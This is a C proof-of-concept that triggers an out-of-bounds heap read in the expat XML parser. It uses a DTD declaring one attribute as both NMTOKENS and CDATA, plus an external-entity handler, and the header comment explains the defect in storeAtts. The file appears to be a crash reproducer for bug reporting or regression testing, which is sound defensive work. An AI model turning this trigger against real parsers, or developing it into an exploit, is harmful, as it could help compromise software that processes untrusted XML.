/* PoC for CVE-2026-76641 class out-of-bounds read (residual defect).
 *
 * Drive through the public API: a parser with an internal DTD subset that
 * declares the very same attribute name "x" for two different elements --
 * once as NMTOKENS (which marks attribute id "x" as maybe-tokenized) and
 * once as CDATA for element "b" -- plus an external general entity whose
 * handler parses an element carrying that attribute.
 *
 * XML_ExternalEntityParserCreate copies the parent DTD through dtdCopy.
 * For element "b", attribute "x" is declared CDATA, so the hash table
 * entry defaultAttForName["x"] is created too small, yet storeAtts reads
 * member .attIndex of that entry when normalizing the attribute value of
 * <b x=' p  q '/>, because attribute id "x" is maybe-tokenized: an
 * 8-byte heap read right past the end of the entry.
 *
 * Expected: AddressSanitizer heap-buffer-overflow READ in storeAtts.
 */
#include <expat.h>
#include <stdio.h>
#include <string.h>

static int XMLCALL
external_entity_loader(XML_Parser parser, const XML_Char *context,
                       const XML_Char *base, const XML_Char *systemId,
                       const XML_Char *publicId) {
  const char *const text = "<b x=' p  q '/>";
  (void)base;
  (void)systemId;
  (void)publicId;

  XML_Parser ext_parser = XML_ExternalEntityParserCreate(parser, context, NULL);
  if (ext_parser == NULL) {
    fprintf(stderr, "XML_ExternalEntityParserCreate failed\n");
    return XML_STATUS_ERROR;
  }
  if (XML_Parse(ext_parser, text, (int)strlen(text), XML_TRUE)
      != XML_STATUS_OK) {
    fprintf(stderr, "external entity: %s at line %lu\n",
            XML_ErrorString(XML_GetErrorCode(ext_parser)),
            (unsigned long)XML_GetCurrentLineNumber(ext_parser));
    XML_ParserFree(ext_parser);
    return XML_STATUS_ERROR;
  }
  XML_ParserFree(ext_parser);
  return XML_STATUS_OK;
}

int
main(void) {
  const char *const text = "<!DOCTYPE doc [\n"
                           "  <!ENTITY e SYSTEM 'entity.ent'>\n"
                           "  <!ELEMENT doc ANY>\n"
                           "  <!ELEMENT a EMPTY>\n"
                           "  <!ELEMENT b EMPTY>\n"
                           "  <!ATTLIST a x NMTOKENS #IMPLIED>\n"
                           "  <!ATTLIST b x CDATA #IMPLIED>\n"
                           "]>\n"
                           "<doc>&e;</doc>\n";

  XML_Parser parser = XML_ParserCreate(NULL);
  if (parser == NULL) {
    fputs("XML_ParserCreate failed\n", stderr);
    return 1;
  }
  XML_SetExternalEntityRefHandler(parser, external_entity_loader);

  const int ok
      = XML_Parse(parser, text, (int)strlen(text), XML_TRUE) == XML_STATUS_OK;
  if (! ok)
    fprintf(stderr, "document: %s at line %lu\n",
            XML_ErrorString(XML_GetErrorCode(parser)),
            (unsigned long)XML_GetCurrentLineNumber(parser));

  XML_ParserFree(parser);
  puts(ok ? "survived" : "parse error");
  return ok ? 0 : 1;
}
